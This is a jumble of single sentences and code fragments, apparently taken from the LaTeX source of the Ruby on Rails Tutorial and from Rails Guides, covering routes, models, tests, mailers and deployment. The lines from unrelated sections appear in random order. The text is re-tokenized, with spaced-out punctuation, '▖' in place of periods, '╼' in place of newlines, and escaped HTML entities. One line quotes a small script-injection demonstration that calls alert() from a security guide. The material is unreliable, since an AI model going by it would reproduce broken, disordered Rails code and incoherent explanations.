To make some actual microposts , we enter information at the new microposts page , \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts / new } { / microposts / new } , as seen in Figure ~ \ ref { fig : demo _ new _ micropost _ rails _ 3 } .
to retrieve the user .
I especially recommend using \ href { http : / / inductionapp ▖ com / } { Induction } to connect to and view the local PostgreSQL database .
* `config ▖ action _ mailer ▖ observers` registers observers which will be notified when mail is delivered .
This route provides the detailed information such as Rails and Ruby version for `public / index ▖ html` in a default Rails application .
= &gt; &#91; &quot; user @ foo .
# # # # capture
class _ name : &quot; User &quot; ,
Furthermore , the filename \ kode { custom ▖ css ▖ scss } includes the \ kode { ▖ css } extension , which indicates a CSS file , and the \ kode { ▖ scss } extension , which indicates a ``Sassy CSS &apos; &apos; file and arranges for the asset pipeline to process the file using Sass .
In the process of writing the tests , we &apos;ll be forced to design aspects of the application , which is one of the nice side-effects of test-driven development .
&lt; % = javascript _ include _ tag &quot; main &quot; % &gt;
\ label { fig : new _ readme } } ╼ \ end { figure } ╼ ╼ % section version _ control ( end ) ╼ ╼ \ section { Deploying } % ( fold ) ╼ \ label { sec : deploying } ╼ ╼
The name may be given as a symbol or string ▖
Passing a `String` to `get` will expect a `controller # action` format , while passing a `Symbol` will map directly to an action :
Active Support extends the method `Range # to _ s` so that it understands an optional format argument ▖
The user index view .
Active Record allows you to validate the state of a model before it gets written ╼ into the database ▖
umerate } ╼ ╼ % subsection login _ form ( end ) ╼ ╼ \ subsection { Finding and authenticating a user } % ( fold ) ╼ \ label { sec : finding _ and _ authenticating _ a _ user } ╼ ╼
&quot; tables &quot; ▖ singularize # = &gt; &quot; table &quot;
The `deep _ dup` method returns deep copy of a given object ▖
The page to show a user ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) .
In Rails , web requests are handled by Action Pack , which splits the work into a controller part ( performing the logic ) and a view part ( rendering a template ) ▖
module Z
These chapters will introduce some of the most powerful features of Rails , including data modeling with \ kode { has \ _ many } and \ kode { has \ _ many through } .
# no regular words or you &apos;ll be exposed to dictionary attacks .
When pushing up the repository , answer yes if you see the question ``Are you sure you want to continue connecting ( yes / no ) ? &apos; &apos;
* Updating the schema
You &apos;re not limited to the functionality that Rails automatically builds into association proxy objects ▖
in Listing ~ \ ref { code : micropost _ ordering } .
The user show page at \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } after adding a Users resource ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ show _ bootstrap-full ▖ png } { ( full size ) }
# # # Dynamic Segments
# This block is called within a transaction ,
&lt; % = link _ to &quot; New Article &quot; , new _ article _ path % &gt;
In particular , by using the Rails library called \ emph { Active Record } , the code in Listing ~ \ ref { code : demo _ user _ model } arranges for \ kode { User ▖ all } to return all the users in the database .
By convention , Rails assumes that the column in the join table used to hold the foreign key pointing to this model is the name of this model with the suffix ` _ id` added ▖
&#124; db / migrate / 20140120201010 _ create _ comments ▖ rb &#124; Migration to create the comments table in your database ( your name will include a different timestamp ) &#124;
With the fixture user as above , we can now write a test for the layout links by converting the sequence enumerated at the beginning of this section into code , as shown in Listing ~ \ ref { code : user _ login _ test _ valid _ information } .
We can express this in code by updating the User and Micropost models as in Listing ~ \ ref { code : demo _ user _ has _ many _ microposts } and Listing ~ \ ref { code : demo _ micropost _ belongs _ to _ user } .
The method `sum` adds the elements of an enumerable :
Formats a number into a US phone number .
Rails adopts the convention of a \ kode { : success } key for a message indicating a successful result ( Listing ~ \ ref { code : signup _ flash } ) .
You will need to add the `actionpack-action _ caching` gem in order to use `caches _ action` and the `actionpack-page _ caching` to use `caches _ pages` in your controllers .
Acknowledgments
Some browsers offer a `` \ href { http : / / stackoverflow ▖ com / questions / 20449641 / rails-4-session-value-never-expires-or-dies-when-browser-closes } { remember where I left off } &apos; &apos; feature , which restores the session automatically , so be sure to disable any such feature before trying to log out .
Using a class method is the preferred way to accept arguments for scopes ▖
Because we didn &apos;t pass the
With the routes defined in Listing ~ \ ref { code : static _ page _ routes } , we &apos;re now in a position to use the resulting named routes in the site layout .
The feed for a user ( id 1 ) following users with ids 2 , 7 , 8 , and 10 .
delegate : size , to : : attachment , prefix : : avatar
Instead , ` / photos / RR27` would match .
( This is the kind of detail you could easily forget initially , which is why acceptance testing ( and TDD generally ) require a certain level of experience to be effective ▖ )
* Sets `env &#91; &quot; rack ▖ multithread &quot; &#93; ` flag to `false` and wraps the application within a Mutex .
Rails uses the Model-View-Controller ( MVC ) pattern for structuring web applications .
The MIT License ╼ ╼ Copyright ( c ) 2014 Michael Hartl ╼ ╼ Permission is hereby granted , free of charge , to any person obtaining a copy ╼ of this software and associated documentation files ( the &quot; Software &quot; ) , to deal ╼ in the Software without restriction , including without limitation the rights ╼ to use , copy , modify , merge , publish , distribute , sublicense , and / or sell ╼ copies of the Software , and to permit persons to whom the Software is ╼ furnished to do so , subject to the following conditions : ╼ ╼ The above copyright notice and this permission notice shall be included in ╼ all copies or substantial portions of the Software .
This will fire up WEBrick , a web server distributed with Ruby by default ▖
Welcome to the \ href { http : / / www ▖ railstutorial ▖ org / ruby-on-rails-tutorial-book } { \ emph { Ruby on Rails Tutorial } } .
Rails comes with built-in support for &#91; SQLite3 &#93; ( http : / / www ▖ sqlite ▖ org ) , which is a lightweight serverless database application ▖
in Listing ~ \ ref { code : user _ pages _ spec } and
Luckily , as we &apos;ve seen with the user fixture &apos;s \ kode { password \ _ digest } attribute , fixture files support embedded Ruby , which \ linebreak means we can create 30 additional users as shown in Listing ~ \ ref { code : users _ fixtures _ extra _ users } .
&gt; &gt; Rails ▖ env
The corresponding user edit view ( which you will have to create by hand ) is shown in Listing ~ \ ref { code : user _ edit _ view } .
In addition , using \ kode { text } gives us greater flexibility should we wish to increase the length limit at a future date ( as part of internationalization , for example ) .
With the code in Listing ~ \ ref { code : users _ resource } , the routing works , but there &apos;s still no page there ( Figure ~ \ ref { fig : user _ show _ unknown _ action } ) .
export ▖ add _ invoices ( invoices )
Since pool is not in the `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` provided connection information its information is merged in ▖
This is because calling \ kode { User ▖ new } doesn &apos;t touch the database ; it simply creates a new Ruby object in memory .
Of course , users should be able to unfollow other users as well as follow them , which leads to the somewhat predictable \ kode { unfollow ! }
This section explains how to run your application inside a directory .
validates : name , presence : { strict : true }
Repeat steps 2--5 as necessary .
An \ kode { authenticate } method that returns the user when the password is correct ( and \ kode { false } otherwise )
If you have a `locked` field on the `Client` model , you also get `find _ by _ locked` and methods .
Since each Rails console session loads the local Rails environment , we can even create a controller explicitly and examine its class hierarchy
This is easy using the \ kode { log \ _ in \ _ as } helper developed in Section ~ \ ref { sec : remember _ tests } ( Listing ~ \ ref { code : test _ helper _ log _ in } ) , as shown in Listing ~ \ ref { code : edit _ tests _ logged _ in } .
# # # `has _ one` Association Reference
Connection : Keep-Alive
LEFT OUTER JOIN orders ON orders ▖ client _ id = client ▖ id WHERE
╼ \ end { enumerate } ╼ ╼ % subsection friendly _ forwarding ( end ) ╼ ╼ % section protecting _ pages ( end ) ╼ ╼ \ section { Showing all users } % ( fold ) ╼ \ label { sec : showing _ all _ users } ╼ ╼
The first step also uses Capybara , while the second uses Capybara &apos;s \ kode { page } object with RSpec ▖ Evidently , all the testing work we &apos;ve done so far with RSpec and Capybara is also useful with Cucumber .
With the completion of the Microposts resource , now is a good time to push the repository up to Bitbucket :
In practice , the guidelines above mean that we &apos;ll usually write controller and model tests first and integration tests ( which test functionality across models , views , and controllers ) second .
The `first` method returns `nil` if no matching record is found and no exception will be raised .
# = &gt; Fri , 15 Oct 1582 00 : 00 : 00 + 0000
Just about every Rails application will interact with a database ▖
def initialize ( person )
&quot; ruby &quot; ▖ pluralize # = &gt; &quot; rubies &quot;
╼ ╼ \ section { Adding some structure } % ( fold ) ╼ \ label { sec : structure } ╼ ╼
* ` ( table _ name ) _ count` - Used to cache the number of belonging objects on ╼ associations ▖
user ▖ update ( name : &apos; Dave &apos; )
It also covers how to test your mailers .
We &apos;ll render the stats partial on the profile page in a moment , but first let &apos;s make a partial for the follow / unfollow button , as shown in Listing ~ \ ref { code : follow _ form _ partial } .
As a final refactoring , we &apos;ll adopt a common convention and define a \ kode { current \ _ user ? } \ boolean method for use in the \ kode { correct \ _ user } before filter , which we define in the Sessions helper ( Listing ~ \ ref { code : current _ user _ p } ) .
The full page flow runs as follows : a user ( John Calvin ) starts at his profile page ( Figure ~ \ ref { fig : page _ flow _ profile _ mockup } ) and navigates to the Users page ( Figure ~ \ ref { fig : page _ flow _ user _ index _ mockup } ) to select a user to follow .
╼ ╼ \ end { itemize } ╼ ╼ % subsection guide _ to _ further _ resources ( end ) ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : following _ users _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ \ item
The ` : file` option takes an absolute file-system path ▖
* `includes`
( Note that , with the code in Listing ~ \ ref { code : home _ root _ route } , the previous route \ kode { static \ _ pages / home } will no longer work ▖ )
For example , the following route will not work :
&lt; li &gt; &lt; % = msg % &gt; &lt; / li &gt;
Now we &apos;ll add a title to each page , getting the tests from Section ~ \ ref { sec : testing _ titles } to pass in the process .
Rails uses Rake extensively , especially for the innumerable little administrative tasks necessary when developing database-backed web applications .
config ▖ static _ cache _ control = &apos; public , max-age = 3600&apos;
We &apos;ll get to the Red part of the Red-Green cycle by writing a failing test for the About page .
* How to send emails from your application async .
Listing ~ \ ref { code : production _ webserver _ config } changes the formatting slightly so that the code fits in the standard 80 columns .
Ruby allows us to do this using the \ kode { self } keyword : inside the \ kode { Word } class , \ kode { self } is the object itself , which means we can use
Deploying Rails applications used to be a pain , but the Rails deployment ecosystem has matured rapidly in the past few years , and now there are several great options .
( We &apos;ll learn more about both classes and inheritance in Section ~ \ ref { sec : ruby _ classes } ▖ )
Adding CSS for nice typography .
SCSS for the Home page sidebar .
ActiveSupport : : Inflector ▖ inflections do &#124; inflect &#124;
Then we check that destroying the user reduces the micropost count by 1 .
A test helper to sign users in .
This section should only be attempted by fairly advanced users and can be skipped without loss of continuity .
Throughout the rest of this chapter , you might find it helpful to consult the \ href { http : / / ruby-doc ▖ org / core-2 ▖ 0 / } { Ruby API } ▖ It &apos;s packed ( perhaps even \ emph { too } packed ) with information ; for example , to learn more about Ruby strings you can look at the Ruby API entry for the \ kode { String } class .
A title test .
The \ emph { Rails Tutorial } often shows output from various programs ( shell commands , version control status , Ruby programs , etc ▖ ) .
The default Rails way to do this is to use \ emph { fixtures } , which are a way of organizing data to be loaded into the test database .
}
group : assets do
# = &gt; { &apos; awaiting _ approval &apos; = &gt; 7 , &apos; paid &apos; = &gt; 12 }
validates : email , presence : true , email : true
# # # Nested Resources
* `change` accepts an additional ` : usec` option .
The resulting \ kode { admin \ _ user } before filter appears in Listing ~ \ ref { code : admin _ destroy _ before _ filter } .
# and to &lt; tt &gt; : update &lt; / tt &gt; if it is not .
# # # `presence`
# # # # # `prev _ week` , `next _ week`
create test / helpers / microposts _ helper _ test ▖ rb
Write a single test or small group of tests .
* ` : counter _ cache`
This view uses embedded Ruby to display the user &apos;s name and email address , assuming the existence of an instance variable called \ kode { @ user } .
# # # # Create a Mailer View
# # # Basic Authentication
Remove the `secret _ token ▖ rb` initializer .
If set , they honor the user time zone .
config ▖ assets ▖ prefix = &apos; / asset-files&apos;
Here &apos;s what a job looks like :
Overwrite / myapp / config / application ▖ rb ?
Let &apos;s check the status to see what changed :
hash # = &gt; { : a = &gt; 1 }
In the source the generated code looked like this :
* `config ▖ time _ zone` sets the default time zone for the application and enables time zone awareness for Active Record .
&lt; p &gt; Product Name : &lt; % = product ▖ name % &gt; &lt; / p &gt;
do _ one _ thing
`app / assets / stylesheets / blorgh / articles ▖ css` ▖
# # # Total of grouped items
A user \ kode { has \ _ many } microposts ▖
The exact command depends on the environment you &apos;re using : on a local system , you just run \ kode { rails server } ( Listing ~ \ ref { code : local _ server } ) , whereas on Cloud9 you need to supply an additional \ emph { IP binding address } and \ emph { \ href { http : / / en ▖ wikipedia ▖ org / wiki / TCP _ and _ UDP _ port } { port number } } to tell the Rails server the address it can use to make the application visible to the outside world ( Listing ~ \ ref { code : cloud _ server } )
# SELECT &quot; users &quot; ▖ * FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; pending &apos; AND &quot; users &quot; ▖ &quot; state &quot; = &apos; inactive&apos;
Since a micropost creation form makes sense only in the context of a particular logged-in user , one goal of this section will be to serve different versions of the Home page depending on a visitor &apos;s login status .
# # # # Equality Conditions
Note that the HTML template in Listing ~ \ ref { code : account _ activation _ view _ html } uses the \ kode { link \ _ to } method to construct a valid link .
The profile page appears as in Figure ~ \ ref { fig : profile _ with _ gravatar } , which shows the default Gravatar image , which appears because \ kode { user @ example ▖ com } isn &apos;t a real email address .
* * Too much cache invalidation * *
These \ kode { name } values allow Rails to construct an initialization hash ( via the \ kode { params } variable ) for creating users using the values entered by the user , as we &apos;ll see in Section ~ \ ref { sec : unsuccessful _ signups } .
I &apos;ll refer back to it frequently in future chapters .
Engines are also closely related to plugins ▖
Destroying a user .
Client ▖ order ( created _ at : : asc )
Since the final result is rather intricate , we &apos;ll build up to the final feed implementation by introducing one piece at a time .
invoke helper
With the code in Listing ~ \ ref { code : authenticated _ p _ fixed } , our full test suite should be \ passing , and both subtleties should now be addressed :
The first of these was included automatically by the migration in Listing ~ \ ref { code : micropost _ migration } via \ kode { belongs \ _ to : user } , as shown in Listing ~ \ ref { code : micropost _ belongs _ to _ user } .
WARNING : Note that in that case `parent` returns `Object` .
indicating that the posts should be ordered newest first .
The last point is particularly worth comparing for some enumerables :
Ssl Sep20 1 : 46 ╼ spring app &#124; sample _ app &#124; started 7 hours ago
&lt; a href = &quot; # &quot; data-background-color = &quot; # 009900 &quot; data-text-color = &quot; # FFFFFF &quot; &gt; Paint it green &lt; / a &gt;
Gherkin tests read much like well-written RSpec examples , but because they are plain-text they are more accessible to those more comfortable reading English than Ruby code .
# # # Avoiding Name Collisions
`form _ for` takes a ` : remote` ╼ option ▖
SELECT categories .
If the parent object ( the one declaring the `has _ one` association ) is unsaved ( that is , `new _ record ? ` returns `true` ) then the child objects are not saved ▖
# # # Merging of scopes
Happily , Rails comes with a command-line program , or \ emph { script } , that runs a \ emph { local } web server to assist us in developing our application .
You can view the search path by inspecting ╼ `Rails ▖ application ▖ config ▖ assets ▖ paths` in the Rails console .
To use `rackup` instead of Rails &apos; `rails server` , you can put the following inside `config ▖ ru` of your Rails application &apos;s root directory :
This last line introduces the equality comparison operator \ kode { = = } , which Ruby shares with many other languages , along with the associated \ kode { ! = } ( ``not equal &apos; &apos; ) , etc ▖ :
The new signup page at \ href { http : / / localhost : 3000 / signup } { / signup } .
----------------
This option allows you to choose an adapter from a list of the most used relational databases ▖
The results of a successful user signup , with flash message .
Default is all directories under `app` .
Within the `app / controllers` directory there is a `blorgh` directory that ╼ contains a file called `application _ controller ▖ rb` ▖
Learn Web Development with Rails
Luckily , most sites will never run into serious scaling issues , and using anything beyond plain Rails is probably premature optimization .
For example , imagine a loop iterating over each person in @ project ▖ people to generate an input tag :
The result of rendering this page into the supplied layout would be this HTML :
Returns a radio button tag for accessing a specified attribute .
Second , for brevity and simplicity many of the book &apos;s code listings include vertical dots , as follows :
invoke erb
person ▖ errors &#91; : name &#93;
resources : users do
This application includes examples of all the major features of Rails , including models , views , controllers , templates , partials , filters , validations , callbacks , \ kode { has \ _ many } / \ kode { belongs \ _ to } and \ kode { has \ _ many through } associations , security , testing , and deployment .
Using ` : plain` or ` : html` might be more appropriate in most of the ╼ time .
class MyCrawler &lt; ThirdPartyLibrary : : Crawler
Thanks to reader \ href { https : / / twitter ▖ com / colmtuite } { Colm Tuite } for his excellent work in helping to convert the sample application over to the Bootstrap CSS framework .
To do so it sends `to _ xml` to every item in turn , and collects the results under a root node ▖
Here the storage mechanism for the forwarding URL is the same \ kode { session } facility we used in Section ~ \ ref { sec : a _ working _ log _ in _ method } to log the user in .
It then assembles the page ▖
╼ $ rails console test
Luckily , for an application running on a Heroku domain ( such as the sample application ) , we can piggyback on Heroku &apos;s SSL certificate , a feature that is included automatically as part of the Heroku platform .
We &apos;ll implement it using the \ kode { aside } tag , which is used for content ( such as sidebars ) that complements the rest of the page but can also stand alone .
When Rails renders a view as a response , it does so by combining the view with the current layout , using the rules for finding the current layout that were covered earlier in this guide ▖
This can be changed to something else :
# For illustration only ; don &apos;t do this unless you mess up a branch
It &apos;s a good convention to have a \ emph { base title } we use on every page , with an optional page title if we want to be more specific .
case-insensitive
This inserts a correctly-formatted data URI into the CSS source .
} ╼ ╼ % subsection two _ subtle _ bugs ( end ) ╼ ╼ \ section { ``Remember me &apos; &apos; checkbox } % ( fold ) ╼ \ label { sec : remember _ me _ checkbox } ╼ ╼
Your comment should indicate that you like the change and what you like about it ▖
First , some code listings include one or more highlighted lines , as seen below :
The sample application Home page ( \ href { http : / / localhost : 3000 / } { / } ) with debug information ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ page _ with _ debug _ 4 _ 0-full ▖ png } { ( full size ) }
belongs _ to : category
The next step is to create a file called \ kode { config / puma ▖ rb } and fill it with the contents of Listing ~ \ ref { code : production _ webserver _ config } .
It is set to true by default .
As in previous chapters , at this early stage we &apos;ll represent pages using mockups
This method accepts three options :
attachments &#91; &apos; filename ▖ jpg &apos; &#93; = File ▖ read ( &apos; / path / to / filename ▖ jpg &apos; )
▖ project
use ActiveRecord : : Migration : : CheckPending
# # # Installing Rails
in Listing ~ \ ref { code : remember _ me _ test } .
An ╼ important distinction to make is that it is the _ controller _ , not the view , ╼ where information is collected ▖
These refer to operations between a \ emph { client } computer ( typically running a web browser such as Firefox or Safari ) and a \ emph { server } ( typically running a web server such as Apache or Nginx ) .
( Actually , there &apos;s a third possibility as well : the \ kode { ERB : : Util } library supplies a \ href { http : / / apidock ▖ com / ruby / ERB / Util / url _ encode } { url \ _ encode } method that has the same effect ▖ )
duplicate = number ▖ deep _ dup
% w ( 1 2 3 4 5 6 7 ) ▖ in _ groups ( 3 , false )
\ label { fig : user _ index _ delete _ links _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { Administrative users } % ( fold ) ╼ \ label { sec : administrative _ users } ╼ ╼
&#124; GET &#124; / geocoder / edit &#124; geocoders # edit &#124; return an HTML form for editing the geocoder &#124;
* `config ▖ active _ support ▖ bare` enables or disables the loading of `active _ support / all` when booting Rails ▖
as shown in Listing ~ \ ref { code : account _ activation _ edit _ action } .
The Static Pages controller test with title tests ▖
You can read more about XPath by doing a web search for \ href { http : / / www ▖ w3schools ▖ com / xpath / xpath _ syntax ▖ asp } { XPath syntax } .
* `vendor / assets` is for assets that are owned by outside entities , such as ╼ code for JavaScript plugins and CSS frameworks .
now = Time ▖ current
The reason is that not all database adapters use case-sensitive indices
Adding a \ kode { hello } action to the Application controller .
You should not be the only person who looks at the code before you submit it ▖ ╼
With that , the core follow / unfollow functionality is complete , and any user can follow or unfollow any other user , as you can verify by clicking the corresponding buttons in your browser .
&quot; fermat &apos;s enigma &quot; ▖ titleize # = &gt; &quot; Fermat &apos;s Enigma &quot;
An ( unsuccessful ) attempt at handling failed signin .
@ user = User ▖ new ( params &#91; : user &#93; )
Users of our toy app will have a unique \ kode { integer } identifier called \ kode { id } , a publicly viewable \ kode { name } ( of type \ kode { string } ) , and an \ kode { email } address ( also a \ kode { string } ) that will double as a username .
The Users controller with a debugger .
authentication
Instead of rendering a ╼ view and sending out the HTTP protocol , they are just sending it out through the ╼ email protocols instead ▖
# # # # cache
With all the work we did in Section ~ \ ref { sec : presence _ validation } , this step is easy .
render nothing : true
Instead , we can write simply \ kode { bundle install } and production gems will be ignored automatically
minimum : 300 ,
To see information about the first application , click on the link ``About your application &apos;s environment &apos; &apos; .
Heroku uses the \ href { http : / / www ▖ postgresql ▖ org / } { PostgreSQL } database ( pronounced ``post-gres-cue-ell &apos; &apos; , and often called ``Postgres &apos; &apos; for short ) , which means that we need to add the \ texttt { pg } ~ gem in the production environment to allow Rails to talk to Postgres
&lt; % = link _ to &apos; Back &apos; , articles _ path % &gt;
commonly used to compile code on Unix systems ( including Linux and Mac OS ~ X ) .
The Home page with an activation message after signup .
image _ submit _ tag ( &quot; login ▖ png &quot; )
There &apos;s just one small problem , which is that \ emph { the Active Record uniqueness validation does not guarantee uniqueness at the database level } .
\ label { fig : flash _ persistence } } ╼ \ end { figure } ╼ ╼ ╼ % subsubsection rendering _ with _ a _ flash _ message ( end ) ╼ ╼ \ subsection { A flash test } % ( fold ) ╼ \ label { sec : a _ flash _ test } ╼ ╼
However , to get the most out of it , you need to have some ╼ prerequisites installed :
use ActionDispatch : : ParamsParser
config ▖ i18n ▖ enforce _ available _ locales = false
You can specify what Rails should route ` &apos; / &apos; ` to with the `root` method :
Page 2 of the users index .
as shown in Listing ~ \ ref { code : password _ reset _ migration } .
# gem &apos; growl &apos; , &apos; 1 ▖ 0 ▖ 3&apos;
# # # Creating the Article model
To find out more about different `rackup` options :
The User data model produced by Listing ~ \ ref { code : users _ migration } .
Provides a number of methods for turning different kinds of containers into a set of option tags .
would generate this HTML :
But there could be a case where the ╼ application calls this class something different , such as `Person` ▖
A password reset email sent in production .
To make the debug output look nice , we &apos;ll add some rules to the custom stylesheet created in Chapter ~ \ ref { cha : filling _ in _ the _ layout } , as shown in Listing ~ \ ref { code : mixin _ and _ debug } .
Can be set to an array of values .
NOTE : Defined in `active _ support / core _ ext / object / acts _ like ▖ rb` .
The examples themselves should use &#91; Rails coding conventions &#93; ( contributing _ to _ ruby _ on _ rails ▖ html # follow-the-coding-conventions ) .
Retrieving Objects from the Database
alias _ method _ chain : process , : stringified _ params
use Rack : : ContentLength
The result appears in Listing ~ \ ref { code : user _ index _ test }
Often , people like their Ajax requests to return JSON ╼ rather than HTML ▖
as shown in Listing ~ \ ref { code : test _ helper _ sessions } .
# = &gt; &lt; input id = &quot; name &quot; name = &quot; name &quot; type = &quot; text &quot; / &gt;
If you run into any problems while following the tutorial , I suggest consulting the resources listed in the \ href { http : / / www ▖ railstutorial ▖ org / # help } { Rails Tutorial help section }
has _ and _ belongs _ to _ many : authors
charset : &quot; UTF-8 &quot; ,
now ▖ all _ quarter
Showing the current user &apos;s followers ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ followers _ bootstrap-full ▖ png } { ( full size ) }
If you follow along in this section typing or copying-and-pasting commands into your own console , you can of course omit the comments if you like ; the console will ignore them in any case .
http : / / example ▖ com / password _ resets / 3BdBrXeQZSWqFIDRN8cxHA / edit ? email = foo % 40bar ▖ com
# &lt; rank &gt; 1 &lt; / rank &gt;
With the partial in hand , including the stats on the Home page is easy , as shown in Listing ~ \ ref { code : home _ page _ stats } .
Thu , 30 Sep 2010 23 : 59 : 59 UTC + 00 : 00
# # # Creating the Blog Application
The first run for this command will output ╼ something such as this :
options = actions ▖ extract _ options !
The route , controller , action and view are now working ╼ harmoniously !
The email configuration in Listing ~ \ ref { code : sendgrid _ config } includes the \ kode { user \ _ name } and \ kode { password } of the SendGrid account , but note that they are accessed via the \ kode { ENV } environment variable instead of being hard-coded .
TIP : The `find _ each` and `find _ in _ batches` methods are intended for use in the batch processing of a large number of records that wouldn &apos;t fit in memory all at once ▖
The captured variable can then be used anywhere else .
* &#91; Keep up to date on the other application layers &#93; ( http : / / secunia ▖ com / ) ( they have a weekly newsletter , too )
With the code in this section , the user edit page should be working , as you can double-check by re-running the test suite , which should now be green :
The second subtlety is that a user could be logged in ( and remembered ) in multiple browsers , such as Chrome and Firefox , which causes a problem if the user logs out in one browser but not the other
Gemfile ▖ lock
Running RSpec should now get us back to Green :
# The priority is based upon order of creation :
( As we &apos;ll see in Section ~ \ ref { sec : image _ upload _ in _ production } , when using Heroku for deployment ImageMagick comes pre-installed in production ▖ )
If the parent object ( the one declaring the `has _ many` association ) is unsaved ( that is , `new _ record ? ` returns `true` ) then the child objects are not saved when they are added ▖
The code in Listing ~ \ ref { code : gravatar _ for _ helper } returns an image tag for the Gravatar with a \ kode { gravatar } CSS class and alt text equal to the user &apos;s name ( which is especially convenient for sight-impaired users using a screen reader ) .
The view for the About page with full HTML structure ▖
\ href { https : / / tutorials ▖ railsapps ▖ org / hartl } { RailsApps } : Instructive sample Rails apps
# = &gt; &#91; &#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; &#93; , &#91; &quot; 4 &quot; , &quot; 5 &quot; &#93; , &#91; &quot; 6 &quot; , &quot; 7 &quot; &#93; &#93;
template _ path : &apos; notifications &apos; ,
options = options ▖ symbolize _ keys
The method is to add \ kode { password } and \ kode { password \ _ confirmation } attributes to the User model , and then require that the two attributes match before the record is saved to the database .
Note that the tests in
We see from the highlighted lines in Listing ~ \ ref { code : about _ test } that the test for the About page is the same as the Home and Help tests with the word ``about &apos; &apos; in place of ``home &apos; &apos; or ``help &apos; &apos; .
It &apos;s pretty likely that other changes to master have happened while you were working ▖
In Rails , a resourceful route provides a mapping between HTTP verbs and URLs to controller actions ▖
If you use the `readonly` method , then the associated object will be read-only when retrieved via the association .
Action Mailer makes it very easy to add attachments .
# # # # Rendering Collections
Client ▖ where ( first _ name : &apos; Ryan &apos; ) ▖ exists ?
All that &apos;s left is to add the proper link to the button on the Home page .
To change a user &apos;s information , we visit the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 / edit } { \ texttt { edit } } page ( Figure ~ \ ref { fig : demo _ edit _ user _ rails _ 3 } ) .
* ▖ swp
This object will be instantiated from the passed attributes , the link through the join table will be created , and , once it passes all of the validations specified on the associated model , the associated object _ will _ be saved .
We can choose any migration name we want , but it &apos;s convenient to end the name with \ kode { \ _ to \ _ users } , since in this case Rails automatically constructs a migration to add columns to the \ kode { users } table .
# # # Runtime Error Checking
Use `ActionController : : Base ▖ default _ static _ extension` instead .
belongs _ to : customer , counter _ cache : : count _ of _ orders
We &apos;ll also add a boolean attribute \ kode { activated } , which will allow us to test if a user is activated using the same kind of auto-generated boolean method we saw in Section ~ \ ref { sec : administrative _ users } :
# # # Benchmark Your Code
We &apos;ll discuss it in detail in Section ~ \ ref { sec : the _ form _ html } , but first let &apos;s style it a little with the SCSS in Listing ~ \ ref { code : form _ css } .
Therefore , a `String` should be ╼ used and then converted to a class using `constantize` in the engine later on .
&lt; div id = &quot; mycode &quot; expr = &quot; alert ( &apos; hah ! &apos; ) &quot;
xml ▖ link ( @ url )
* The general layout of a Rails application .
( Writing a test for the error messages is left as an exercise ( Section ~ \ ref { sec : signup _ exercises } ) ▖ )
Go ahead now and create a new file at `app / views / articles / new ▖ html ▖ erb` and ╼ write this content in it :
If you want the old 3 ▖ 0 ▖ x behavior back , you could supply `format : false` like this :
This file contains many sample routes on commented ╼ lines , and one of them actually shows you how to connect the root of your site ╼ to a specific controller and action ▖
I shall be late ! &quot; ▖ truncate _ words ( 4 )
follow _ redirect !
In fact , one of the best ways to understand the associations is to use them in the web interface , as seen in the next section .
Access control for relationships ▖
* Rails 3 and above require Ruby 1 ▖ 8 ▖ 7 or higher ▖
TIP : You may want to &#91; put your Git branch name in your shell prompt &#93; ( http : / / qugstart ▖ com / blog / git-and-svn / add-colored-git-branch-name-to-your-shell-prompt / ) to make it easier to remember which version of the code you &apos;re working with .
123 ▖ to _ s ( : human ) # = &gt; &quot; 123 &quot;
This would work also with the string \ kode { &apos; activation &apos; } , but using a symbol is more conventional , and in either case
$ bundle exec rake db : rollback
I &apos;m sorry .
rest = hash ▖ extract ! ( : a ) # = &gt; { : a = &gt; 1 }
With the proper \ kode { form \ _ for } in hand , it &apos;s easy to make a login form to match the mockup in Figure ~ \ ref { fig : login _ mockup } using the signup form ( Listing ~ \ ref { code : signup _ form } ) as a model , as shown in Listing ~ \ ref { code : login _ form } .
The method `constantize` resolves the constant reference expression in its receiver :
&lt; p &gt; Thanks for joining and have a great day !
# = &gt; Tue , 09 Aug 2011
Article ▖ includes ( : comments ) ▖ where ( &quot; comments ▖ visible = true &quot; ) ▖ references ( : comments )
After restarting the development server to activate the configuration in Listing ~ \ ref { code : development _ email _ settings } , we next need to update the User mailer \ emph { preview file } , which was automatically generated in Section ~ \ ref { sec : account _ activation _ mailer } , as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
B ▖ x # = &gt; : b
The flash-less profile page after a browser reload ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ flash _ reloaded _ bootstrap-full ▖ png } { ( full size ) }
backgroundColor = $ ( this ) ▖ data ( &quot; background-color &quot; )
This is the strategy adopted by the Rails asset pipeline .
The resulting new user page ( at the URL / signup ) appears in Figure ~ \ ref { fig : new _ signup _ page } .
One of the things that we may ask you to do is to &quot; squash your commits &quot; , which ╼ will combine all of your commits into a single commit ▖
If we wish for a scope to be applied across all queries to the model we can use the ╼ `default _ scope` method within the model itself .
The simplest way to use this is to have a single `yield` , into which the entire contents of the view currently being rendered is inserted :
create app / helpers / blorgh / comments _ helper ▖ rb
# in your controller
In other words , all the pages are identical in structure , including the contents of the title tag , with the sole exception of the material inside the \ kode { body } tag .
However , if your database is not using UTF-8 internally , it ╼ may not be able to store all characters that your users enter ▖
Ruby 1 ▖ 9 actually guarantees that hashes keep their elements in the same order entered , but it would be unwise ever to count on a particular ordering .
* `config ▖ action _ mailer ▖ sendmail _ settings` allows detailed configuration for the `sendmail` delivery method ▖
In Section ~ \ ref { sec : logging _ in } , we used the Rails \ kode { session } method to store the user &apos;s id , but this information disappears when the user closes their browser .
This avoids ╼ storing an invalid object in the database ▖
The result appears in Listing ~ \ ref { code : email _ downcase }
This is the sample application for
